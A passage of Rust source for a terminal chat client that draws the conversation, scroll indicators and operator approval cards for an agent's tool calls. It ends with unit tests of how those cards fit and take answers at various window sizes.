    Line::from(line)
}

/// The Audit panel's line naming Ctrl+K, which the frame beside the
/// transcript puts on the section's rule instead.
const VERIFY_LINE: &str = "Ctrl+K verifies the chain";

/// Cells an Environment line's name takes before its value.
const ENV_LABEL: usize = 7;

/// The tool names in at most `rows` rows of `width` cells: all of them,
/// or as many as fit with `+N more` saying how many did not.
pub(crate) fn tool_names(names: &[&str], width: usize, rows: usize) -> Vec<String> {
    if rows == 0 || names.is_empty() {
        return Vec::new();
    }
    let all = wrap(&names.join(", "), width);
    if all.len() <= rows {
        return all;
    }
    for shown in (0..names.len()).rev() {
        let more = format!("+{} more", names.len() - shown);
        let text = if shown == 0 {
            more
        } else {
            format!("{}, {more}", names[..shown].join(", "))
        };
        let wrapped = wrap(&text, width);
        if wrapped.len() <= rows {
            return wrapped;
        }
    }
    vec![format!("+{} more", names.len())]
}

/// The keys a first screen teaches, before anything is sent.
const FIRST_KEYS: &[(&str, &str)] = &[
    ("Enter", "send the message"),
    ("Ctrl+J", "new line in the draft"),
    ("PgUp PgDn", "scroll the conversation"),
    ("↑ ↓ wheel", "scroll three rows"),
    ("/", "list the commands"),
    ("Ctrl+G", "every key and command"),
];
/// What an empty draft says, until the first message.
const DRAFT_PLACEHOLDER: &str = " type a message · / for commands";

/// An empty conversation's screen: how to send, the keys a newcomer
/// needs first, and how many of the agent's tools ask before they run.
fn first_screen(app: &App) -> Vec<Line<'static>> {
    use palette::{BLUE, GRAY, TEXT, WHITE, on_bg};
    let mut lines = vec![
        Line::raw(""),
        Line::styled("  Type a message, then press Enter.", on_bg(WHITE)),
        Line::raw(""),
    ];
    for (key, what) in FIRST_KEYS {
        lines.push(Line::from(vec![
            Span::styled("  ", on_bg(TEXT)),
            Span::styled(format!("{key:<13}"), on_bg(BLUE)),
            Span::styled(what.to_string(), on_bg(TEXT)),
        ]));
    }
    if let Some(tools) = app.status.as_ref().map(|s| &s.tools)
        && let Some(count) = tools.count
    {
        lines.push(Line::raw(""));
        lines.push(Line::styled(
            format!(
                "  {} of this agent's {count} tools ask you first.",
                tools.ask_first
            ),
            on_bg(GRAY),
        ));
    }
    lines
}

/// The transcript's rows at `width` cells, oldest first.
fn transcript_lines(app: &App, width: usize) -> Vec<Line<'static>> {
    if app.entries.is_empty() {
        return first_screen(app);
    }
    let mut lines: Vec<Line<'static>> = Vec::new();
    use palette::{AMBER, CYAN, GRAY, RED, TEXT, WHITE, on_bg};
    for (i, entry) in app.entries.iter().enumerate() {
        if i > 0
            && matches!(entry, Entry::Tool { .. })
            && matches!(app.entries[i - 1], Entry::Tool { .. })
        {
            // Tool calls in a row are one block.
            lines.pop();
        }
        match entry {
            Entry::User(text) => {
                lines.push(Line::styled("you", on_bg(WHITE)));
                indented(&mut lines, text, width, on_bg(TEXT));
            }
            Entry::Agent(text) => {
                lines.push(Line::styled(sanitize(&app.agent), on_bg(CYAN)));
                for row in super::markdown::lines(&sanitize(text), width.saturating_sub(2)) {
                    let mut spans = vec![Span::raw("  ")];
                    spans.extend(row.spans);
                    lines.push(Line::from(spans));
                }
            }
            Entry::Tool {
                name,
                arguments,
                outcome,
                output,
                ..
            } => {
                let (state, state_color) = match outcome {
                    None if app.expired.as_ref().is_some_and(|a| a.tool_name == *name) => {
                        ("expired", RED)
                    }
                    None if app.cards.iter().any(|c| c.ask.tool_name == *name) => {
                        ("needs approval", AMBER)
                    }
                    None => ("running", AMBER),
                    Some(true) => ("done", GRAY),
                    Some(false) => ("failed", RED),
                };
                // The whole call, wrapped under itself, the state its last
                // words.
                let call = format!(
                    "tool {} {} {state}",
                    sanitize(name),
                    sanitize(arguments).replace('\n', " ")
                );
                let rows = wrap(&call, width.saturating_sub(5).max(1));
                let mut state_left = state.chars().filter(|c| *c != ' ').count();
                let mut drawn: Vec<Line<'static>> = Vec::new();
                for (k, row) in rows.iter().enumerate().rev() {
                    // The row's tail that is still the state.
                    let mut split = row.len();
                    for (at, c) in row.char_indices().rev() {
                        if state_left == 0 {
                            break;
                        }
                        if c != ' ' {
                            state_left -= 1;
                        }
                        split = at;
                    }
                    let (plain, colored) = row.split_at(split);
                    let indent = if k == 0 { "  " } else { "    " };
                    drawn.push(Line::from(vec![
                        Span::styled(format!("{indent}{plain}"), on_bg(TEXT)),
                        Span::styled(colored.to_string(), on_bg(state_color)),
                    ]));
                }
                drawn.reverse();
                lines.extend(drawn);
                // What the tool returned, under its line, however the
                // model's reply then went.
                let returned = sanitize(output);
                let body = if returned.trim().is_empty() {
                    Vec::new()
                } else {
                    wrap(returned.trim_end(), width.saturating_sub(4))
                };
                let cut = body.len() > TOOL_OUTPUT_ROWS;
                for row in body.into_iter().take(TOOL_OUTPUT_ROWS) {
                    lines.push(Line::styled(format!("    {row}"), on_bg(GRAY)));
                }
                if cut {
                    lines.push(Line::styled("    ... (cut)", on_bg(GRAY)));
                }
            }
            Entry::Note(text) => {
                // A refusal reads as one; every other note is the chat
                // speaking, in the color of what waits on the operator.
                let color = if text.starts_with("Refused ") {
                    RED
                } else {
                    AMBER
                };
                for row in wrap(&sanitize(text), width.saturating_sub(2)) {
                    lines.push(Line::styled(format!("  {row}"), on_bg(color)));
                }
            }
        }
        lines.push(Line::raw(""));
    }
    lines
}

/// Which of `total` rows a view of `height` shows, scrolled `scroll` up
/// from the latest: `[start, end)`, with `start` rows above it and
/// `total - end` below.
fn view_window(total: usize, height: usize, scroll: usize) -> (usize, usize) {
    let below = scroll.min(total.saturating_sub(height));
    let end = total - below;
    (end.saturating_sub(height), end)
}

/// The transcript box's title: the chat and the agent.
fn transcript_title(app: &App) -> Line<'static> {
    use palette::{CYAN, RULE, TEXT, on_bg};
    Line::from(vec![
        Span::styled(" wirken chat ", on_bg(TEXT)),
        Span::styled("·", on_bg(RULE)),
        Span::styled(" ", on_bg(TEXT)),
        Span::styled(sanitize(&app.agent), on_bg(CYAN)),
        Span::styled(" ", on_bg(TEXT)),
    ])
}

/// The compact layout's title, left: the chat, the agent and its model.
fn meter_title(app: &App) -> Line<'static> {
    use palette::{CYAN, GRAY, RULE, TEXT, on_bg};
    let mut spans = vec![
        Span::styled(" wirken ", on_bg(TEXT)),
        Span::styled("·", on_bg(RULE)),
        Span::styled(" ", on_bg(TEXT)),
        Span::styled(sanitize(&app.agent), on_bg(CYAN)),
        Span::styled(" ", on_bg(TEXT)),
    ];
    if let Some(env) = app.status.as_ref().map(|s| &s.environment)
        && !env.model.is_empty()
    {
        spans.push(Span::styled("·", on_bg(RULE)));
        spans.push(Span::styled(
            format!(" {}/{} ", sanitize(&env.provider), sanitize(&env.model)),
            on_bg(GRAY),
        ));
    }
    Line::from(spans)
}

/// The compact layout's title, right: what the panels say in three
/// numbers. The context used, the audit rows, and the refusals when there
/// are any.
fn meter(app: &App) -> Line<'static> {
    use palette::{GRAY, RULE, on_bg};
    let Some(status) = &app.status else {
        return Line::raw("");
    };
    let mut parts = Vec::new();
    // Before anything is sent the gateway knows the window and has used
    // none of it.
    if let Some(window) = status.context.window
        && window > 0
    {
        let used = status.context.used_tokens.unwrap_or(0);
        parts.push(format!("ctx {}%", used.saturating_mul(100) / window));
    }
    let rows = status.audit.rows;
    parts.push(format!(
        "{rows} audit row{}",
        if rows == 1 { "" } else { "s" }
    ));
    if status.approvals.denied > 0 {
        parts.push(format!("{} denied", status.approvals.denied));
    }
    let mut spans = vec![Span::styled(" ", on_bg(GRAY))];
    for (i, part) in parts.into_iter().enumerate() {
        if i > 0 {
            spans.push(Span::styled(" · ", on_bg(RULE)));
        }
        spans.push(Span::styled(part, on_bg(GRAY)));
    }
    spans.push(Span::styled(" ", on_bg(GRAY)));
    Line::from(spans).right_aligned()
}

/// The transcript box: titled for the layout it is drawn in.
fn transcript_block(app: &App, compact: bool) -> Block<'static> {
    let block = Block::default()
        .borders(Borders::ALL)
        .border_style(palette::on_bg(palette::RULE));
    if compact {
        block.title(meter_title(app)).title(meter(app))
    } else {
        block.title(transcript_title(app))
    }
}

/// Draw the transcript into `area`, and return how many rows are below
/// the view: the scroll as drawn, not as asked for.
fn draw_transcript(frame: &mut Frame<'_>, app: &App, area: Rect, meter: bool) -> usize {
    let width = usize::from(area.width.saturating_sub(2)).max(1);
    let mut lines = transcript_lines(app, width);
    // Over a card the last entry's blank row goes: the rows are few.
    if lines.last().is_some_and(|l| l.width() == 0) {
        lines.pop();
    }
    let height = usize::from(area.height.saturating_sub(2));
    let (start, end) = view_window(lines.len(), height, app.scroll);
    let block = transcript_block(app, meter);
    frame.render_widget(
        Paragraph::new(lines[start..end].to_vec()).block(block),
        area,
    );
    lines.len() - end
}

/// The rows of a scroll thumb on a track of `track` rows, for a view of
/// `track` rows `above` rows into `total`: `[start, end)`. Empty when all
/// of it is in view.
fn thumb(track: usize, total: usize, above: usize) -> (usize, usize) {
    if total <= track || track == 0 {
        return (0, 0);
    }
    let round = |n: usize| (n + total / 2) / total;
    let size = round(track * track).clamp(1, track);
    let start = round(above * track).min(track - size);
    (start, start + size)
}

/// The transcript and the draft in one box: the conversation above, the
/// rule naming the draft, then the draft's `input` rows. Once the
/// conversation is taller than its rows, a thumb in the right border
/// and the rule's right end say where the view is: rows above, rows
/// below, and the key back to the latest. Returns the rows below.
fn draw_conversation(
    frame: &mut Frame<'_>,
    app: &App,
    area: Rect,
    input_title: &str,
    input: &[String],
) -> usize {
    use palette::{BLUE, GRAY, RULE, TEXT, on_bg};
    let width = usize::from(area.width.saturating_sub(2)).max(1);
    let input_rows = u16::try_from(input.len().max(1)).unwrap_or(1);
    let content_rows = area.height.saturating_sub(3 + input_rows);
    let lines = transcript_lines(app, width);
    let height = usize::from(content_rows);
    let (start, end) = view_window(lines.len(), height, app.scroll);
    let (above, below) = (start, lines.len() - end);
    app.page_rows.set(height);

    let compact = frame.area().width < WIDE_COLS;
    frame.render_widget(transcript_block(app, compact), area);
    if compact && area.height > 2 {
        // In the compact layout the keys to the columns put away sit on
        // the bottom border.
        let bottom = Rect::new(area.x, area.bottom() - 1, area.width, 1);
        frame.render_widget(
            Paragraph::new(bottom_hint(
                usize::from(area.width.saturating_sub(2)),
                &[("Ctrl+B", "conversations"), ("Ctrl+P", "panels")],
            )),
            bottom,
        );
    }
    let content = Rect::new(
        area.x + 1,
        area.y + 1,
        area.width.saturating_sub(2),
        content_rows,
    );
    frame.render_widget(Paragraph::new(lines[start..end].to_vec()), content);

    // The thumb, in the right border beside the rows it stands for.
    let (t0, t1) = thumb(height, lines.len(), above);
    let right = area.right().saturating_sub(1);
    for row in t0..t1 {
        let y = content.y + u16::try_from(row).unwrap_or(0);
        if let Some(cell) = frame.buffer_mut().cell_mut((right, y)) {
            cell.set_symbol("█").set_style(on_bg(GRAY));
        }
    }

    // The rule between the conversation and the draft.
    let rule_y = content.y + content_rows;
    let mut position: Vec<Span<'static>> = Vec::new();
    if lines.len() > height {
        position.push(Span::styled(format!("↑ {above} above"), on_bg(GRAY)));
        if below > 0 {
            position.push(Span::styled(" · ", on_bg(RULE)));
            position.push(Span::styled(format!("↓ {below} below"), on_bg(TEXT)));
            position.push(Span::styled(" · ", on_bg(RULE)));
            position.push(Span::styled("End", on_bg(BLUE)));
            position.push(Span::styled(" latest", on_bg(GRAY)));
        }
    }
    let total = usize::from(area.width);
    let title = format!(" {input_title} ");
    let used = 1 + width_of(&title) + 1;
    let position_width: usize = position.iter().map(|s| width_of(&s.content)).sum();
    let mut rule = vec![
        Span::styled("├", on_bg(RULE)),
        Span::styled(title, on_bg(GRAY)),
    ];
    let fill = if position_width > 0 {
        total.saturating_sub(used + position_width + 2)
    } else {
        total.saturating_sub(used)
    };
    rule.push(Span::styled("─".repeat(fill), on_bg(RULE)));
    if position_width > 0 {
        rule.push(Span::styled(" ", on_bg(RULE)));
        rule.extend(position);
        rule.push(Span::styled(" ", on_bg(RULE)));
    }
    rule.push(Span::styled("┤", on_bg(RULE)));
    frame.render_widget(
        Paragraph::new(Line::from(rule)),
        Rect::new(area.x, rule_y, area.width, 1),
    );

    let draft = Rect::new(
        area.x + 1,
        rule_y + 1,
        area.width.saturating_sub(2),
        input_rows,
    );
    let typed = if app.entries.is_empty() && app.draft.is_empty() {
        vec![Line::styled(DRAFT_PLACEHOLDER, on_bg(palette::DIM))]
    } else {
        input.iter().cloned().map(Line::raw).collect::<Vec<_>>()
    };
    frame.render_widget(Paragraph::new(typed), draft);
    below
}

fn indented(lines: &mut Vec<Line<'static>>, text: &str, width: usize, style: Style) {
    for row in wrap(&sanitize(text), width.saturating_sub(2)) {
        lines.push(Line::styled(format!("  {row}"), style));
    }
}

/// Cells a card's labels take before their values.
const CARD_LABEL: usize = 13;
/// Windows shorter than this show a card as one line, refusal only.
const CARD_MIN_ROWS: u16 = 15;

/// One field of the card: its label, its value's rows, and how the value
/// is drawn.
struct CardField {
    label: &'static str,
    rows: Vec<String>,
    kind: FieldKind,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum FieldKind {
    /// The request, with its tier set apart.
    Request,
    /// What will run: the action key and the arguments.
    Code,
    Plain,
}

/// The order a card's long values give up rows when it does not fit,
/// first to last. The reply-to goes first, the arguments last.
const CUT_ORDER: [&str; 7] = [
    "in reply to",
    "runs",
    "model's claim (unverified)",
    "arguments",
    "request",
    "action key",
    "runtime",
];

/// How a card is drawn in the rows it has.
enum CardFit {
    /// Whole, with or without the spacer row before the instruction.
    Whole { spacer: bool },
    /// Values cut to `rows` each, by label; `cut` rows in all.
    Cut {
        rows: Vec<(&'static str, usize)>,
        cut: usize,
    },
    /// One line: the window is too short for the card at all.
    OneLine,
}

/// `tier3` as the title says it: `tier 3`.
fn tier_words(tier: &str) -> String {
    match tier.strip_prefix("tier") {
        Some(n) if !n.is_empty() => format!("tier {n}"),
        _ => tier.to_string(),
    }
}

/// The card, the transcript above it in what rows are left, and the
/// hints for the key bar.
fn draw_card_screen(
    frame: &mut Frame<'_>,
    app: &App,
    area: Rect,
    window_rows: u16,
    now: Instant,
) -> &'static [(&'static str, &'static str)] {
    use palette::{AMBER, BG, CYAN, GRAY, RULE, TEXT, WHITE, on_bg};
    let inner = usize::from(area.width.saturating_sub(2)).max(1);
    let amber = on_bg(AMBER);

    // An expired card: what became of it, and how to put it away.
    if let Some(ask) = &app.expired {
        let said = format!(
            "The request to run {} expired; the gateway records it as refused.",
            sanitize(&ask.tool_name)
        );
        let mut lines = vec![card_title(
            &format!(
                "approval expired · {} · {}",
                tier_words(&ask.tier),
                sanitize(&ask.tool_name)
            ),
            None,
            inner,
        )];
        for row in wrap(&said, inner) {
            lines.push(card_row(vec![Span::styled(row, on_bg(WHITE))], inner));
        }
        lines.push(card_rule("Enter or Esc to dismiss", None, inner, amber));
        lines.push(card_row(Vec::new(), inner));
        lines.push(card_bottom(inner));
        place_card(frame, app, area, lines);
        app.card_cut.set(true);
        return HINTS_EXPIRED;
    }
    let Some(card) = app.front_card() else {
        return HINTS;
    };
    let ask = &card.ask;
    // Values wrap one cell short of the border; a cut value's last row,
    // with its count, runs to it.
    let value_room = inner.saturating_sub(CARD_LABEL).max(10);
    let value_width = value_room.saturating_sub(1).max(10);
    let mut fields = Vec::new();
    let mut claim: Option<Vec<String>> = None;
    for line in ask.card().lines() {
        let value = sanitize(&line.value);
        if line.is_model_claim {
            // Indented two cells, and kept two from the right border.
            claim = Some(wrap(&value, inner.saturating_sub(4).max(10)));
            continue;
        }
        let kind = match line.label {
            "request" => FieldKind::Request,
            "action key" | "arguments" => FieldKind::Code,
            _ => FieldKind::Plain,
        };
        fields.push(CardField {
            label: line.label,
            rows: wrap(&value, value_width),
            kind,
        });
    }
    let instruction = match card.armed_at {
        Some(at) if now < at => "Read the request; it takes an answer in a moment.",
        _ => "Type y and Enter to approve; n, a reason, or anything else refuses.",
    };
    let instruction = wrap(instruction, inner);
    // The notice that takes the instruction's place on a cut card,
    // counted with the widest count it could say.
    let notice = |cut: usize| {
        [
            match cut {
                1 => "Card cut: 1 row does not fit this window, so it cannot be approved here."
                    .to_string(),
                n => format!(
                    "Card cut: {n} rows do not fit this window, so it cannot be approved here."
                ),
            },
            "Enlarge the window to approve. Until then only a refusal is accepted.".to_string(),
        ]
    };
    let countdown = card.expires_at.map(|at| {
        format!(
            "Closes in {}s.",
            at.saturating_duration_since(now).as_secs()
        )
    });
    let waiting = app.cards.len().saturating_sub(1);
    let countdown = match (waiting, countdown) {
        (0, c) => c,
        (n, Some(c)) => Some(format!("{n} more waiting · {c}")),
        (n, None) => Some(format!("{n} more waiting")),
    };

    // What fits: the whole card, then the card without its spacer, then
    // the card with long values cut, then one line.
    let fields_rows: usize = fields.iter().map(|f| f.rows.len()).sum();
    let claim_rows = claim.as_ref().map_or(0, |c| 1 + c.len());
    let fixed = 1 + 3;
    let body = usize::from(area.height);
    let natural = fixed + fields_rows + claim_rows + 1 + instruction.len();
    let notice_rows: usize = notice(999).iter().map(|s| wrap(s, inner).len()).sum();
    let fit = if window_rows < CARD_MIN_ROWS {
        CardFit::OneLine
    } else if natural <= body {
        CardFit::Whole { spacer: true }
    } else if natural - 1 <= body {
        CardFit::Whole { spacer: false }
    } else {
        let mut need = (fixed + fields_rows + claim_rows + notice_rows).saturating_sub(body);
        let mut rows: Vec<(&'static str, usize)> = fields
            .iter()
            .map(|f| (f.label, f.rows.len()))
            .chain(claim.as_ref().map(|c| (CUT_ORDER[2], c.len())))
            .collect();
        let mut cut = 0;
        for label in CUT_ORDER {
            if let Some((_, n)) = rows.iter_mut().find(|(l, _)| *l == label) {
                let take = need.min(n.saturating_sub(1));
                *n -= take;
                need -= take;
                cut += take;
            }
        }
        if need > 0 {
            CardFit::OneLine
        } else {
            CardFit::Cut { rows, cut }
        }
    };

    if let CardFit::OneLine = fit {
        // The transcript, and under it one line that says the card cannot
        // be answered here, but for a refusal.
        let [above, line] =
            Layout::vertical([Constraint::Min(0), Constraint::Length(1)]).areas(area);
        draw_transcript(frame, app, above, true);
        let mut said = " This request cannot be approved at this size. Enter refuses.".to_string();
        if let Some(c) = &countdown {
            said.push(' ');
            said.push_str(c);
        }
        frame.render_widget(
            Paragraph::new(Line::styled(said, Style::default().fg(BG).bg(AMBER))),
            line,
        );
        app.card_cut.set(true);
        app.card_one_line.set(true);
        return HINTS_CARD_ONE_LINE;
    }
    app.card_one_line.set(false);

    let allowed = |label: &str, n: usize| match &fit {
        CardFit::Cut { rows, .. } => rows
            .iter()
            .find(|(l, _)| *l == label)
            .map_or(n, |(_, a)| *a),
        _ => n,
    };
    // The last row a cut value keeps, with what it gave up at its end.
    let with_count = |row: &str, room: usize, gone: usize| -> (String, String) {
        let count = format!(" … +{gone} row{}", if gone == 1 { "" } else { "s" });
        let keep = room.saturating_sub(width_of(&count));
        let text: String = row.chars().take(keep).collect();
        let pad = keep.saturating_sub(width_of(&text));
        (format!("{text}{}", " ".repeat(pad)), count)
    };

    let cut_total = match &fit {
        CardFit::Cut { cut, .. } => Some(*cut),
        _ => None,
    };
    let title = format!(
        "approval needed · {} · {}",
        tier_words(&ask.tier),
        sanitize(&ask.tool_name)
    );
    let mut lines = vec![card_title(
        &title,
        cut_total.map(|n| format!("{n} row{} cut", if n == 1 { "" } else { "s" })),
        inner,
    )];
    for field in &fields {
        let keep = allowed(field.label, field.rows.len());
        let gone = field.rows.len() - keep;
        for (i, row) in field.rows.iter().take(keep).enumerate() {
            let lead = if i == 0 {
                format!("{:<CARD_LABEL$}", format!("{}:", field.label))
            } else {
                " ".repeat(CARD_LABEL)
            };
            let mut spans = vec![Span::styled(lead, on_bg(GRAY))];
            let (text, count) = if gone > 0 && i + 1 == keep {
                let (t, c) = with_count(row, value_room, gone);
                (t, Some(c))
            } else {
                (row.clone(), None)
            };
            match field.kind {
                FieldKind::Code => spans.push(Span::styled(text, on_bg(WHITE))),
                FieldKind::Plain => spans.push(Span::styled(text, on_bg(TEXT))),
                FieldKind::Request => {
                    let tier = format!("({})", sanitize(&ask.tier));
                    match text.rfind(&tier) {
                        Some(at) => {
                            let (before, rest) = text.split_at(at);
                            let (tier_text, after) = rest.split_at(tier.len());
                            spans.push(Span::styled(before.to_string(), on_bg(TEXT)));
                            spans.push(Span::styled(tier_text.to_string(), amber));
                            spans.push(Span::styled(after.to_string(), on_bg(TEXT)));
                        }
                        None => spans.push(Span::styled(text, on_bg(TEXT))),
                    }
                }
            }
            if let Some(count) = count {
                spans.push(Span::styled(count, amber));
            }
            lines.push(card_row(spans, inner));
        }
    }
    // The model's claim, last, under its own rule.
    if let Some(claim) = &claim {
        lines.push(Line::from(vec![
            Span::styled("╟ ", amber),
            Span::styled("model's claim ", on_bg(GRAY)),
            Span::styled("(unverified)", amber),
            Span::styled(": ", on_bg(GRAY)),
            Span::styled(
                "─".repeat(inner.saturating_sub(width_of("model's claim (unverified): ") + 1)),
                on_bg(RULE),
            ),
            Span::styled("╢", amber),
        ]));
        let keep = allowed(CUT_ORDER[2], claim.len());
        let gone = claim.len() - keep;
        for (i, row) in claim.iter().take(keep).enumerate() {
            let mut spans = vec![Span::styled("  ", on_bg(CYAN))];
            if gone > 0 && i + 1 == keep {
                let (text, count) = with_count(row, inner.saturating_sub(2), gone);
                spans.push(Span::styled(text, on_bg(CYAN)));
                spans.push(Span::styled(count, amber));
            } else {
                spans.push(Span::styled(row.clone(), on_bg(CYAN)));
            }
            lines.push(card_row(spans, inner));
        }
    }
    match &fit {
        CardFit::Cut { cut, .. } => {
            for (i, sentence) in notice(*cut).iter().enumerate() {
                let style = if i == 0 { amber } else { on_bg(WHITE) };
                for row in wrap(sentence, inner) {
                    lines.push(card_row(vec![Span::styled(row, style)], inner));
                }
            }
        }
        CardFit::Whole { spacer } => {
            if *spacer {
                lines.push(card_row(Vec::new(), inner));
            }
            for row in &instruction {
                lines.push(card_row(
                    vec![Span::styled(row.clone(), on_bg(WHITE))],
                    inner,
                ));
            }
        }
        CardFit::OneLine => {}
    }
    lines.push(card_rule("your answer", countdown.as_deref(), inner, amber));
    let answer: String = sanitize(&app.answer);
    lines.push(card_row(
        vec![Span::styled(answer.clone(), on_bg(WHITE))],
        inner,
    ));
    lines.push(card_bottom(inner));

    let card_rows = u16::try_from(lines.len()).unwrap_or(u16::MAX);
    let card_area = place_card(frame, app, area, lines);
    let answer_y = card_area.bottom().saturating_sub(2);
    let x = card_area.x + 1 + u16::try_from(width(&answer)).unwrap_or(0);
    frame.set_cursor_position(Position::new(
        x.min(card_area.right().saturating_sub(2)),
        answer_y,
    ));
    app.card_cut.set(matches!(fit, CardFit::Cut { .. }));
    if area.height.saturating_sub(card_rows) >= 3 {
        HINTS_CARD
    } else {
        HINTS_CARD_HIDDEN
    }
}

/// Draw `lines`, a card, at the bottom of `area`, and the transcript in
/// the rows above it: a box with the meter where three rows or more are
/// left, else one row saying the conversation is put away. Returns where
/// the card is.
fn place_card(frame: &mut Frame<'_>, app: &App, area: Rect, lines: Vec<Line<'static>>) -> Rect {
    use palette::{GRAY, RULE, on_bg};
    let rows = u16::try_from(lines.len())
        .unwrap_or(u16::MAX)
        .min(area.height);
    let spare = area.height - rows;
    let card_area = Rect::new(area.x, area.bottom() - rows, area.width, rows);
    if spare >= 3 {
        draw_transcript(
            frame,
            app,
            Rect::new(area.x, area.y, area.width, spare),
            true,
        );
    } else if spare >= 1 {
        let note = " conversation hidden while this card is open ";
        let mut spans = vec![Span::styled("─", on_bg(RULE))];
        spans.extend(meter_title(app).spans);
        let used: usize = spans.iter().map(|s| width_of(&s.content)).sum();
        let fill = usize::from(area.width).saturating_sub(used + width_of(note) + 1);
        spans.push(Span::styled("─".repeat(fill), on_bg(RULE)));
        spans.push(Span::styled(note, on_bg(GRAY)));
        spans.push(Span::styled("─", on_bg(RULE)));
        frame.render_widget(
            Paragraph::new(Line::from(spans)),
            Rect::new(area.x, area.y, area.width, 1),
        );
    }
    frame.render_widget(Paragraph::new(lines), card_area);
    card_area
}

/// The card's top: `title` and, at the right, what was cut.
fn card_title(title: &str, right: Option<String>, inner: usize) -> Line<'static> {
    let amber = palette::on_bg(palette::AMBER);
    let title = format!(" {title} ");
    let right = right.map(|r| format!(" {r} ")).unwrap_or_default();
    let fill = inner.saturating_sub(width_of(&title) + width_of(&right));
    Line::from(vec![
        Span::styled("╔", amber),
        Span::styled(title, amber),
        Span::styled("═".repeat(fill), amber),
        Span::styled(right, amber),
        Span::styled("╗", amber),
    ])
}

/// A rule across the card naming the row under it, `right` at its end.
fn card_rule(name: &str, right: Option<&str>, inner: usize, rule: Style) -> Line<'static> {
    use palette::{AMBER, WHITE, on_bg};
    let name = format!(" {name} ");
    let right = right.map(|r| format!(" {r} ")).unwrap_or_default();
    let fill = inner.saturating_sub(width_of(&name) + width_of(&right));
    Line::from(vec![
        Span::styled("╟", on_bg(AMBER)),
        Span::styled(name, on_bg(WHITE)),
        Span::styled("─".repeat(fill), rule),
        Span::styled(right, on_bg(WHITE)),
        Span::styled("╢", on_bg(AMBER)),
    ])
}

/// One row inside the card: `spans`, padded to the card's width.
fn card_row(mut spans: Vec<Span<'static>>, inner: usize) -> Line<'static> {
    let amber = palette::on_bg(palette::AMBER);
    let used: usize = spans.iter().map(|s| width_of(&s.content)).sum();
    spans.insert(0, Span::styled("║", amber));
    spans.push(Span::styled(
        " ".repeat(inner.saturating_sub(used)),
        palette::on_bg(palette::TEXT),
    ));
    spans.push(Span::styled("║", amber));
    Line::from(spans)
}

fn card_bottom(inner: usize) -> Line<'static> {
    let amber = palette::on_bg(palette::AMBER);
    Line::from(vec![
        Span::styled("╚", amber),
        Span::styled("═".repeat(inner), amber),
        Span::styled("╝", amber),
    ])
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::commands::chat::wire::{ApprovalAsk, ServerEvent};
    use ratatui::Terminal;
    use ratatui::backend::TestBackend;

    fn screen(app: &App, now: Instant) -> String {
        let mut terminal = Terminal::new(TestBackend::new(60, 30)).unwrap();
        terminal.draw(|f| draw(f, app, now)).unwrap();
        let buffer = terminal.backend().buffer().clone();
        let mut out = String::new();
        for y in 0..buffer.area.height {
            for x in 0..buffer.area.width {
                out.push_str(buffer[(x, y)].symbol());
            }
            out.push('\n');
        }
        out
    }

    fn row_text(buffer: &ratatui::buffer::Buffer, y: u16) -> String {
        (0..buffer.area.width)
            .map(|x| buffer[(x, y)].symbol().to_string())
            .collect()
    }

    fn all_text(buffer: &ratatui::buffer::Buffer) -> String {
        (0..buffer.area.height)
            .map(|y| row_text(buffer, y))
            .collect::<Vec<_>>()
            .join("\n")
    }

    fn pipeline_card(app: &mut App, now: Instant) {
        app.on_server(
            ServerEvent::Approval(ApprovalAsk {
                request_id: "r1".into(),
                tool_name: "exec".into(),
                action_key: "shell::pipeline:".into(),
                tier: "tier3".into(),
                agent: "default".into(),
                trigger: "Use the exec tool to run this command: ls | wc -l".into(),
                exec_location: "runs in sandbox container (exec_only, read-only root, workspace at /workspace, no network)".into(),
                arguments: r#"{"command":"ls | wc -l"}"#.into(),
                assistant_text: String::new(),
                timeout_secs: 300,
                exec_runtime: "docker".into(),
            }),
            now,
        );
    }

    /// The card's last line, how it is answered, is wrapped and read
    /// whole at each size, and the card takes an answer there. It used to
    /// be one line cut at the card's edge, mid-word at 120 columns.
    #[test]
    fn the_card_says_how_to_answer_it_in_full_at_each_size() {
        let now = Instant::now();
        let later = now + std::time::Duration::from_secs(2);
        for (w, h) in [(80u16, 24u16), (120, 24), (120, 40), (64, 30)] {
            let mut app = App::new(Some("default".into()), "c-1".into());
            pipeline_card(&mut app, now);
            let buffer = drawn(&app, later, w, h);
            let words = all_text(&buffer)
                .replace(
                    [
                        '║', '╔', '╗', '╚', '╝', '═', '╟', '╢', '─', '│', '┌', '┐', '└', '┘',
                    ],
                    " ",
                )
                .split_whitespace()
                .collect::<Vec<_>>()
                .join(" ");
            for whole in [
                "Type y and Enter to approve; n, a reason, or anything else refuses.",
                "your answer Closes in",
                "approval needed · tier 3 · exec",
            ] {
                assert!(
                    words.contains(whole),
                    "{w}x{h}: {whole:?} not whole:\n{}",
                    all_text(&buffer)
                );
            }
            assert!(
                !app.card_cut.get(),
                "{w}x{h}: a card shown whole takes an answer"
            );
        }
    }

    /// A card whose last line does not fit takes no approval, as a card
    /// whose arguments were cut does.
    #[test]
    fn a_card_without_room_for_its_last_line_takes_no_approval() {
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let now = Instant::now();
        let later = now + std::time::Duration::from_secs(2);
        let mut app = App::new(Some("default".into()), "c-1".into());
        pipeline_card(&mut app, now);
        drawn(&app, later, 120, 14);
        assert!(app.card_cut.get(), "the card's last line is off the screen");
        app.on_key(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE), later);
        let sent = app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE), later);
        assert!(
            !matches!(
                sent,
                Some(crate::commands::chat::app::Outgoing::Decision { approve: true, .. })
            ),
            "{sent:?}"
        );
    }

    #[test]
    fn the_rule_says_above_only_at_the_latest_row_and_nothing_when_it_fits() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.entries.push(Entry::Note("short".into()));
        let fits = text_of(&drawn(&app, now, 120, 24));
        assert!(!fits.contains("above") && !fits.contains("█"), "{fits}");
        for n in 0..40 {
            app.entries.push(Entry::Note(format!("line {n}")));
        }
        let latest = text_of(&drawn(&app, now, 120, 24));
        assert!(latest.contains("↑ 63 above ┤"), "{latest}");
        assert!(
            !latest.contains("below") && latest.contains("█"),
            "{latest}"
        );
        assert_eq!(thumb(19, 46, 17), (7, 15));
        assert_eq!(thumb(35, 46, 1), (1, 28));
        assert_eq!(thumb(19, 19, 0), (0, 0));
    }

    #[test]
    fn model_text_reaches_the_screen_without_its_escapes() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.on_server(
